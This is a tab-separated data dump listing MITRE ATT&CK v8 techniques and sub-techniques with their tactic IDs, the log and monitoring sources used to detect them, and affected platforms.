T1489	Service Stop	\N	\N	T1489	TA0040	\N	{"File monitoring","Process command-line parameters","Process monitoring","Windows Registry","API monitoring"}	'Windows', 'Linux', 'macOS'	ATT&CK v8
T1129	Shared Modules	\N	\N	T1129	TA0002	\N	{"API monitoring","DLL monitoring","File monitoring","Process monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.001	Compiled HTML File	T1218.001	TA0005	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.005	Mshta	T1218.005	TA0005	\N	{"File monitoring","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.008	Odbcconf	T1218.008	TA0005	\N	{"Loaded DLLs","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.009	Regsvcs/Regasm	T1218.009	TA0005	\N	{"Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.011	Rundll32	T1218.011	TA0005	\N	{"DLL monitoring","Loaded DLLs","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1216	Signed Script Proxy Execution	\N	\N	T1216	TA0005	\N	{"Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1216	Signed Script Proxy Execution	T1216.001	PubPrn	T1216.001	TA0005	\N	{"Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1153	Source	\N	\N	T1153	TA0002	\N	{"Process monitoring","File monitoring","Process command-line parameters"}	'Linux', 'macOS'	ATT&CK v8
T1528	Steal Application Access Token	\N	\N	T1528	TA0006	\N	{"Azure activity logs","OAuth audit logs"}	'SaaS', 'Office 365', 'Azure AD', 'Google Workspace'	ATT&CK v8
T1558	Steal or Forge Kerberos Tickets	\N	\N	T1558	TA0006	\N	{"Windows event logs","Authentication logs"}	'Windows'	ATT&CK v8
T1558	Steal or Forge Kerberos Tickets	T1558.002	Silver Ticket	T1558.002	TA0006	\N	{"Authentication logs","Windows event logs"}	'Windows'	ATT&CK v8
T1558	Steal or Forge Kerberos Tickets	T1558.003	Kerberoasting	T1558.003	TA0006	\N	{"Authentication logs","Windows event logs"}	'Windows'	ATT&CK v8
T1553	Subvert Trust Controls	T1553.002	Code Signing	T1553.002	TA0005	\N	{"Binary file metadata"}	'macOS', 'Windows'	ATT&CK v8
T1560	Archive Collected Data	\N	\N	T1560	TA0009	\N	{"Process monitoring","Process command-line parameters","File monitoring","Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1560	Archive Collected Data	T1560.002	Archive via Library	T1560.002	TA0009	\N	{"Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1020	Automated Exfiltration	T1020.001	Traffic Duplication	T1020.001	TA0010	\N	{"Netflow/Enclave netflow","Packet capture","Network protocol analysis"}	'Network'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.001	Registry Run Keys / Startup Folder	T1547.001	TA0003,TA0004	\N	{"Windows Registry","File monitoring"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.008	LSASS Driver	T1547.008	TA0003,TA0004	\N	{"DLL monitoring","File monitoring","Loaded DLLs","Process monitoring"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.010	Port Monitors	T1547.010	TA0003,TA0004	\N	{"File monitoring","API monitoring","DLL monitoring","Windows Registry","Process monitoring"}	'Windows'	ATT&CK v8
T1037	Boot or Logon Initialization Scripts	T1037.003	Network Logon Script	T1037.003	TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1110	Brute Force	T1110.001	Password Guessing	T1110.001	TA0006	\N	{"Authentication logs","Office 365 account logs"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1580	Cloud Infrastructure Discovery	\N	\N	T1580	TA0007	\N	{"GCP audit logs","Stackdriver logs","AWS CloudTrail logs","Azure activity logs"}	'IaaS'	ATT&CK v8
T1526	Cloud Service Discovery	\N	\N	T1526	TA0007	\N	{"Azure activity logs","Stackdriver logs","AWS CloudTrail logs"}	'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Google Workspace'	ATT&CK v8
T1059	Command and Scripting Interpreter	T1059.001	PowerShell	T1059.001	TA0002	\N	{"Windows event logs","Process monitoring","Process command-line parameters","PowerShell logs","Loaded DLLs","File monitoring","DLL monitoring"}	'Windows'	ATT&CK v8
T1059	Command and Scripting Interpreter	T1059.003	Windows Command Shell	T1059.003	TA0002	\N	{"Windows event logs","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1059	Command and Scripting Interpreter	T1059.004	Unix Shell	T1059.004	TA0002	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'macOS', 'Linux'	ATT&CK v8
T1059	Command and Scripting Interpreter	T1059.008	Network Device CLI	T1059.008	TA0002	\N	{"Network device logs","Network device run-time memory","Network device command history","Network device configuration"}	'Network'	ATT&CK v8
T1175	Component Object Model and Distributed COM	\N	\N	T1175	TA0002,TA0008	\N	{"PowerShell logs","API monitoring","Authentication logs","DLL monitoring","Packet capture","Process monitoring","Windows Registry","Windows event logs"}	'Windows'	ATT&CK v8
T1136	Create Account	\N	\N	T1136	TA0003	\N	{"Office 365 account logs","Azure activity logs","AWS CloudTrail logs","Process monitoring","Process command-line parameters","Authentication logs","Windows event logs"}	'Windows', 'Azure AD', 'Office 365', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1136	Create Account	T1136.002	Domain Account	T1136.002	TA0003	\N	{"Process monitoring","Process command-line parameters","Authentication logs","Windows event logs"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1195	Supply Chain Compromise	\N	\N	T1195	TA0001	\N	{"Web proxy","File monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1195	Supply Chain Compromise	T1195.002	Compromise Software Supply Chain	T1195.002	TA0001	\N	{"File monitoring","Web proxy"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1195	Supply Chain Compromise	T1195.003	Compromise Hardware Supply Chain	T1195.003	TA0001	\N	{"Component firmware",BIOS,"Disk forensics",EFI}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1016	System Network Configuration Discovery	\N	\N	T1016	TA0007	\N	{"Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1049	System Network Connections Discovery	\N	\N	T1049	TA0007	\N	{"Process monitoring","Process command-line parameters"}	'Windows', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1007	System Service Discovery	\N	\N	T1007	TA0007	\N	{"Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1529	System Shutdown/Reboot	\N	\N	T1529	TA0040	\N	{"Windows event logs","Process command-line parameters","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1080	Taint Shared Content	\N	\N	T1080	TA0008	\N	{"File monitoring","Process monitoring"}	'Windows'	ATT&CK v8
T1205	Traffic Signaling	\N	\N	T1205	TA0011,TA0005,TA0003	\N	{"Packet capture","Netflow/Enclave netflow"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1537	Transfer Data to Cloud Account	\N	\N	T1537	TA0010	\N	{"Stackdriver logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1127	Trusted Developer Utilities Proxy Execution	\N	\N	T1127	TA0005	\N	{"File monitoring","Process monitoring"}	'Windows'	ATT&CK v8
T1552	Unsecured Credentials	T1552.003	Bash History	T1552.003	TA0006	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1552	Unsecured Credentials	T1552.004	Private Keys	T1552.004	TA0006	\N	{"File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1552	Unsecured Credentials	T1552.005	Cloud Instance Metadata API	T1552.005	TA0006	\N	{"Authentication logs","AWS CloudTrail logs","Azure activity logs"}	'IaaS'	ATT&CK v8
T1552	Unsecured Credentials	T1552.006	Group Policy Preferences	T1552.006	TA0006	\N	{"Process command-line parameters","Windows event logs"}	'Windows'	ATT&CK v8
T1535	Unused/Unsupported Cloud Regions	\N	\N	T1535	TA0005	\N	{"Stackdriver logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1550	Use Alternate Authentication Material	T1550.001	Application Access Token	T1550.001	TA0005,TA0008	\N	{"Office 365 audit logs","OAuth audit logs"}	'Office 365', 'SaaS', 'Google Workspace'	ATT&CK v8
T1550	Use Alternate Authentication Material	T1550.002	Pass the Hash	T1550.002	TA0005,TA0008	\N	{"Authentication logs"}	'Windows'	ATT&CK v8
T1550	Use Alternate Authentication Material	T1550.003	Pass the Ticket	T1550.003	TA0005,TA0008	\N	{"Authentication logs"}	'Windows'	ATT&CK v8
T1204	User Execution	\N	\N	T1204	TA0002	\N	{Anti-virus,"Process command-line parameters","Process monitoring"}	'Linux', 'Windows', 'macOS', 'IaaS', 'Containers'	ATT&CK v8
T1204	User Execution	T1204.001	Malicious Link	T1204.001	TA0002	\N	{Anti-virus,"Process monitoring","Web proxy"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1600	Weaken Encryption	T1600.001	Reduce Key Space	T1600.001	TA0005	\N	{"File monitoring"}	'Network'	ATT&CK v8
T1071	Application Layer Protocol	T1071.004	DNS	T1071.004	TA0011	\N	{"Netflow/Enclave netflow","DNS records","Process monitoring","Process use of network","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1555	Credentials from Password Stores	T1555.001	Keychain	T1555.001	TA0006	\N	{"PowerShell logs","Process monitoring","File monitoring","System calls","API monitoring"}	'macOS'	ATT&CK v8
T1485	Data Destruction	\N	\N	T1485	TA0040	\N	{"File monitoring","Process command-line parameters","Process monitoring"}	'Windows', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1132	Data Encoding	T1132.002	Non-Standard Encoding	T1132.002	TA0011	\N	{"Packet capture","Process use of network","Process monitoring","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1565	Data Manipulation	T1565.001	Stored Data Manipulation	T1565.001	TA0040	\N	{"File monitoring","Application logs"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1001	Data Obfuscation	\N	\N	T1001	TA0011	\N	{"Packet capture","Process use of network","Process monitoring","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1001	Data Obfuscation	T1001.001	Junk Data	T1001.001	TA0011	\N	{"Packet capture","Process use of network","Process monitoring","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1074	Data Staged	T1074.002	Remote Data Staging	T1074.002	TA0009	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Windows', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1530	Data from Cloud Storage Object	\N	\N	T1530	TA0009	\N	{"Stackdriver logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1602	Data from Configuration Repository	T1602.002	Network Device Configuration Dump	T1602.002	TA0009	\N	{"Netflow/Enclave netflow","Network protocol analysis","Packet capture"}	'Network'	ATT&CK v8
T1213	Data from Information Repositories	T1213.001	Confluence	T1213.001	TA0009	\N	{"Third-party application logs","Authentication logs"}	'SaaS'	ATT&CK v8
T1005	Data from Local System	\N	\N	T1005	TA0009	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1025	Data from Removable Media	\N	\N	T1025	TA0009	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1491	Defacement	T1491.001	Internal Defacement	T1491.001	TA0040	\N	{"Web logs","Web application firewall logs","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1561	Disk Wipe	T1561.001	Disk Content Wipe	T1561.001	TA0040	\N	{"Kernel drivers","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1561	Disk Wipe	T1561.002	Disk Structure Wipe	T1561.002	TA0040	\N	{"Kernel drivers","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1114	Email Collection	T1114.001	Local Email Collection	T1114.001	TA0009	\N	{"Process monitoring","File monitoring","Authentication logs","Mail server"}	'Windows'	ATT&CK v8
T1114	Email Collection	T1114.003	Email Forwarding Rule	T1114.003	TA0009	\N	{"Process use of network","Process monitoring","Email gateway","Mail server","Office 365 trace logs"}	'Office 365', 'Windows', 'Google Workspace'	ATT&CK v8
T1573	Encrypted Channel	T1573.001	Symmetric Cryptography	T1573.001	TA0011	\N	{"SSL/TLS inspection","Process monitoring","Process use of network","Malware reverse engineering","Netflow/Enclave netflow","Packet capture"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1573	Encrypted Channel	T1573.002	Asymmetric Cryptography	T1573.002	TA0011	\N	{"Process monitoring","Process use of network","Malware reverse engineering","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1499	Endpoint Denial of Service	T1499.001	OS Exhaustion Flood	T1499.001	TA0040	\N	{"Network device logs","Netflow/Enclave netflow","Network intrusion detection system","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1499	Endpoint Denial of Service	T1499.003	Application Exhaustion Flood	T1499.003	TA0040	\N	{"Network device logs","Network device logs","Network intrusion detection system","Web application firewall logs","Web logs","SSL/TLS inspection"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1585	Establish Accounts	T1585.001	Social Media Accounts	T1585.001	TA0042	\N	{"Social media monitoring"}	'PRE'	ATT&CK v8
T1546	Event Triggered Execution	\N	\N	T1546	TA0003,TA0004	\N	{"API monitoring","Windows event logs","System calls","Binary file metadata","Process use of network","WMI Objects","File monitoring","Process command-line parameters","Process monitoring","Loaded DLLs","DLL monitoring","Windows Registry"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.002	Screensaver	T1546.002	TA0003,TA0004	\N	{"File monitoring","Windows Registry","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.005	Trap	T1546.005	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'macOS', 'Linux'	ATT&CK v8
T1546	Event Triggered Execution	T1546.006	LC_LOAD_DYLIB Addition	T1546.006	TA0003,TA0004	\N	{"File monitoring","Process command-line parameters","Process monitoring","Binary file metadata"}	'macOS'	ATT&CK v8
T1078	Valid Accounts	\N	\N	T1078	TA0005,TA0001,TA0003,TA0004	\N	{"AWS CloudTrail logs","Stackdriver logs","Authentication logs","Process monitoring"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1078	Valid Accounts	T1078.003	Local Accounts	T1078.003	TA0005,TA0001,TA0003,TA0004	\N	{"Authentication logs"}	'Linux', 'macOS', 'Windows', 'Containers'	ATT&CK v8
T1125	Video Capture	\N	\N	T1125	TA0009	\N	{"Process monitoring","File monitoring","API monitoring"}	'Windows', 'macOS'	ATT&CK v8
T1497	Virtualization/Sandbox Evasion	\N	\N	T1497	TA0005,TA0007	\N	{"Process monitoring","Process command-line parameters"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1497	Virtualization/Sandbox Evasion	T1497.003	Time Based Evasion	T1497.003	TA0005,TA0007	\N	{"Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1600	Weaken Encryption	T1600.002	Disable Crypto Hardware	T1600.002	TA0005	\N	{"File monitoring"}	'Network'	ATT&CK v8
T1047	Windows Management Instrumentation	\N	\N	T1047	TA0002	\N	{"Authentication logs","Netflow/Enclave netflow","Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1220	XSL Script Processing	\N	\N	T1220	TA0005	\N	{"Process monitoring","Process command-line parameters","Process use of network","DLL monitoring"}	'Windows'	ATT&CK v8
T1543	Create or Modify System Process	T1543.004	Launch Daemon	T1543.004	TA0003,TA0004	\N	{"File monitoring"}	'macOS'	ATT&CK v8
T1546	Event Triggered Execution	T1546.009	AppCert DLLs	T1546.009	TA0003,TA0004	\N	{"Windows Registry","Process command-line parameters","Process monitoring","Loaded DLLs"}	'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.011	Application Shimming	T1546.011	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","Windows Registry"}	'Windows'	ATT&CK v8
T1480	Execution Guardrails	T1480.001	Environmental Keying	T1480.001	TA0005	\N	{"Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1011	Exfiltration Over Other Network Medium	\N	\N	T1011	TA0010	\N	{"User interface","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1211	Exploitation for Defense Evasion	\N	\N	T1211	TA0005	\N	{"Windows Error Reporting","Process monitoring","File monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1210	Exploitation of Remote Services	\N	\N	T1210	TA0008	\N	{"Windows Error Reporting","Process monitoring","File monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1083	File and Directory Discovery	\N	\N	T1083	TA0007	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1222	File and Directory Permissions Modification	T1222.001	Windows File and Directory Permissions Modification	T1222.001	TA0005	\N	{"Windows event logs","Process command-line parameters","Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1590	Gather Victim Network Information	T1590.006	Network Security Appliances	T1590.006	TA0043	\N	\N	'PRE'	ATT&CK v8
T1200	Hardware Additions	\N	\N	T1200	TA0001	\N	{"Asset management","Data loss prevention"}	'Windows', 'Linux', 'macOS'	ATT&CK v8
T1564	Hide Artifacts	\N	\N	T1564	TA0005	\N	{"API monitoring","PowerShell logs","Authentication logs","Process command-line parameters","Process monitoring","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1564	Hide Artifacts	T1564.003	Hidden Window	T1564.003	TA0005	\N	{"File monitoring","Process monitoring","Process command-line parameters","PowerShell logs"}	'macOS', 'Windows'	ATT&CK v8
T1564	Hide Artifacts	T1564.004	NTFS File Attributes	T1564.004	TA0005	\N	{"Process command-line parameters","API monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.001	DLL Search Order Hijacking	T1574.001	TA0005,TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","DLL monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.005	Executable Installer File Permissions Weakness	T1574.005	TA0005,TA0003,TA0004	\N	{"Process command-line parameters","File monitoring"}	'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.008	Path Interception by Search Order Hijacking	T1574.008	TA0005,TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.011	Services Registry Permissions Weakness	T1574.011	TA0005,TA0003,TA0004	\N	{"Windows Registry",Services,"Process command-line parameters"}	'Windows'	ATT&CK v8
T1562	Impair Defenses	T1562.002	Disable Windows Event Logging	T1562.002	TA0005	\N	{"Process monitoring","Windows event logs","Process command-line parameters"}	'Windows'	ATT&CK v8
T1562	Impair Defenses	T1562.004	Disable or Modify System Firewall	T1562.004	TA0005	\N	{"File monitoring","Process command-line parameters","Windows Registry"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1562	Impair Defenses	T1562.007	Disable or Modify Cloud Firewall	T1562.007	TA0005	\N	{"Stackdriver logs","GCP audit logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1070	Indicator Removal on Host	\N	\N	T1070	TA0005	\N	{"File monitoring","Process monitoring","Process command-line parameters","API monitoring","Windows event logs"}	'Linux', 'macOS', 'Windows', 'Containers'	ATT&CK v8
T1070	Indicator Removal on Host	T1070.002	Clear Linux or Mac System Logs	T1070.002	TA0005	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1070	Indicator Removal on Host	T1070.006	Timestomp	T1070.006	TA0005	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1105	Ingress Tool Transfer	\N	\N	T1105	TA0011	\N	{"Process command-line parameters","File monitoring","Packet capture","Process use of network","Netflow/Enclave netflow","Network protocol analysis","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1056	Input Capture	T1056.002	GUI Input Capture	T1056.002	TA0009,TA0006	\N	{"PowerShell logs","User interface","Process command-line parameters","Process monitoring"}	'macOS', 'Windows'	ATT&CK v8
T1056	Input Capture	T1056.004	Credential API Hooking	T1056.004	TA0009,TA0006	\N	{"Windows event logs","Process monitoring","Loaded DLLs","DLL monitoring","Binary file metadata","API monitoring"}	'Windows'	ATT&CK v8
T1534	Internal Spearphishing	\N	\N	T1534	TA0008	\N	{"SSL/TLS inspection","DNS records",Anti-virus,"Web proxy","File monitoring","Mail server","Office 365 trace logs"}	'Windows', 'macOS', 'Linux', 'Office 365', 'SaaS', 'Google Workspace'	ATT&CK v8
T1570	Lateral Tool Transfer	\N	\N	T1570	TA0008	\N	{"Process command-line parameters","File monitoring","Packet capture","Process use of network","Netflow/Enclave netflow","Network protocol analysis","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1557	Man-in-the-Middle	\N	\N	T1557	TA0009,TA0006	\N	{"File monitoring","Netflow/Enclave netflow","Packet capture"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1557	Man-in-the-Middle	T1557.001	LLMNR/NBT-NS Poisoning and SMB Relay	T1557.001	TA0009,TA0006	\N	{"Windows event logs","Windows Registry","Packet capture","Netflow/Enclave netflow"}	'Windows'	ATT&CK v8
T1036	Masquerading	T1036.001	Invalid Code Signature	T1036.001	TA0005	\N	{"File monitoring","Process monitoring","Binary file metadata"}	'macOS', 'Windows'	ATT&CK v8
T1036	Masquerading	T1036.003	Rename System Utilities	T1036.003	TA0005	\N	{"File monitoring","Process monitoring","Process command-line parameters","Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1036	Masquerading	T1036.005	Match Legitimate Name or Location	T1036.005	TA0005	\N	{"File monitoring","Process monitoring","Process command-line parameters","Binary file metadata"}	'Linux', 'macOS', 'Windows', 'Containers'	ATT&CK v8
T1556	Modify Authentication Process	T1556.001	Domain Controller Authentication	T1556.001	TA0006,TA0005,TA0003	\N	{"Authentication logs","API monitoring","DLL monitoring"}	'Windows'	ATT&CK v8
T1556	Modify Authentication Process	T1556.004	Network Device Authentication	T1556.004	TA0006,TA0005,TA0003	\N	{"File monitoring"}	'Network'	ATT&CK v8
T1203	Exploitation for Client Execution	\N	\N	T1203	TA0002	\N	{Anti-virus,"System calls","Process monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1601	Modify System Image	\N	\N	T1601	TA0005	\N	{"Network device run-time memory","Network device configuration","File monitoring"}	'Network'	ATT&CK v8
T1601	Modify System Image	T1601.001	Patch System Image	T1601.001	TA0005	\N	{"Network device run-time memory","Network device configuration","File monitoring"}	'Network'	ATT&CK v8
T1026	Multiband Communication	\N	\N	T1026	TA0011	\N	{"Packet capture","Netflow/Enclave netflow","Process use of network","Malware reverse engineering","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1046	Network Service Scanning	\N	\N	T1046	TA0007	\N	{"Netflow/Enclave netflow","Network protocol analysis","Packet capture","Process command-line parameters","Process use of network"}	'Windows', 'IaaS', 'Linux', 'macOS', 'Containers'	ATT&CK v8
T1040	Network Sniffing	\N	\N	T1040	TA0006,TA0007	\N	{"Network device logs","Host network interface","Netflow/Enclave netflow","Process monitoring"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1095	Non-Application Layer Protocol	\N	\N	T1095	TA0011	\N	{"Host network interface","Netflow/Enclave netflow","Network intrusion detection system","Network protocol analysis","Packet capture","Process use of network"}	'Windows', 'Linux', 'macOS', 'Network'	ATT&CK v8
T1571	Non-Standard Port	\N	\N	T1571	TA0011	\N	{"Process monitoring","Process use of network","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1003	OS Credential Dumping	T1003.001	LSASS Memory	T1003.001	TA0006	\N	{"Process command-line parameters","PowerShell logs","Process monitoring"}	'Windows'	ATT&CK v8
T1003	OS Credential Dumping	T1003.002	Security Account Manager	T1003.002	TA0006	\N	{"Process command-line parameters","PowerShell logs","Process monitoring"}	'Windows'	ATT&CK v8
T1003	OS Credential Dumping	T1003.005	Cached Domain Credentials	T1003.005	TA0006	\N	{"PowerShell logs","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1027	Obfuscated Files or Information	T1027.002	Software Packing	T1027.002	TA0005	\N	{"Binary file metadata"}	'macOS', 'Windows'	ATT&CK v8
T1137	Office Application Startup	T1137.001	Office Template Macros	T1137.001	TA0003	\N	{"Windows Registry","Process monitoring","Process command-line parameters","File monitoring"}	'Windows', 'Office 365'	ATT&CK v8
T1137	Office Application Startup	T1137.002	Office Test	T1137.002	TA0003	\N	{"DLL monitoring","Loaded DLLs","Process monitoring","Process command-line parameters","File monitoring","Windows Registry"}	'Windows', 'Office 365'	ATT&CK v8
T1137	Office Application Startup	T1137.005	Outlook Rules	T1137.005	TA0003	\N	{"Mail server","Process monitoring","Process command-line parameters"}	'Windows', 'Office 365'	ATT&CK v8
T1034	Path Interception	\N	\N	T1034	TA0003,TA0004	\N	{"File monitoring","Process monitoring"}	'Windows'	ATT&CK v8
T1120	Peripheral Device Discovery	\N	\N	T1120	TA0007	\N	{"PowerShell logs","API monitoring","Process monitoring","Process command-line parameters"}	'Windows', 'macOS'	ATT&CK v8
T1069	Permission Groups Discovery	T1069.003	Cloud Groups	T1069.003	TA0007	\N	{"GCP audit logs","Stackdriver logs","AWS CloudTrail logs","Azure activity logs","Office 365 account logs","API monitoring","Process monitoring","Process command-line parameters"}	'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Google Workspace'	ATT&CK v8
T1566	Phishing	T1566.001	Spearphishing Attachment	T1566.001	TA0001	\N	{"File monitoring","Packet capture","Network intrusion detection system","Detonation chamber","Email gateway","Mail server"}	'macOS', 'Windows', 'Linux'	ATT&CK v8
T1566	Phishing	T1566.002	Spearphishing Link	T1566.002	TA0001	\N	{"Packet capture","Web proxy","Email gateway","Detonation chamber","SSL/TLS inspection","DNS records","Mail server"}	'Linux', 'macOS', 'Windows', 'Office 365', 'SaaS', 'Google Workspace'	ATT&CK v8
T1598	Phishing for Information	T1598.002	Spearphishing Attachment	T1598.002	TA0043	\N	{"Mail server","Email gateway"}	'PRE'	ATT&CK v8
T1542	Pre-OS Boot	T1542.001	System Firmware	T1542.001	TA0005,TA0003	\N	{EFI,BIOS,"API monitoring"}	'Windows'	ATT&CK v8
T1542	Pre-OS Boot	T1542.004	ROMMONkit	T1542.004	TA0005,TA0003	\N	{"File monitoring","Netflow/Enclave netflow","Network protocol analysis","Packet capture"}	'Network'	ATT&CK v8
T1055	Process Injection	T1055.001	Dynamic-link Library Injection	T1055.001	TA0005,TA0004	\N	{"Process monitoring","DLL monitoring","File monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1055	Process Injection	T1055.004	Asynchronous Procedure Call	T1055.004	TA0005,TA0004	\N	{"Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1055	Process Injection	T1055.009	Proc Memory	T1055.009	TA0005,TA0004	\N	{"Process monitoring","File monitoring"}	'Linux'	ATT&CK v8
T1055	Process Injection	T1055.013	Process Doppelgnging	T1055.013	TA0005,TA0004	\N	{"File monitoring","Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1090	Proxy	\N	\N	T1090	TA0011	\N	{"SSL/TLS inspection","Process use of network","Process monitoring","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1090	Proxy	T1090.001	Internal Proxy	T1090.001	TA0011	\N	{"Process use of network","Process monitoring","Network protocol analysis","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1090	Proxy	T1090.003	Multi-hop Proxy	T1090.003	TA0011	\N	{"Packet capture","Network protocol analysis","Netflow/Enclave netflow"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1012	Query Registry	\N	\N	T1012	TA0007	\N	{"Windows Registry","Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1563	Remote Service Session Hijacking	\N	\N	T1563	TA0008	\N	{"Process command-line parameters","Process monitoring","Netflow/Enclave netflow","Authentication logs"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1496	Resource Hijacking	\N	\N	T1496	TA0040	\N	{"Azure activity logs","Stackdriver logs","AWS CloudTrail logs","Process use of network","Process monitoring","Network protocol analysis","Network device logs"}	'Windows', 'IaaS', 'Linux', 'macOS', 'Containers'	ATT&CK v8
T1207	Rogue Domain Controller	\N	\N	T1207	TA0005	\N	{"API monitoring","Authentication logs","Network protocol analysis","Packet capture"}	'Windows'	ATT&CK v8
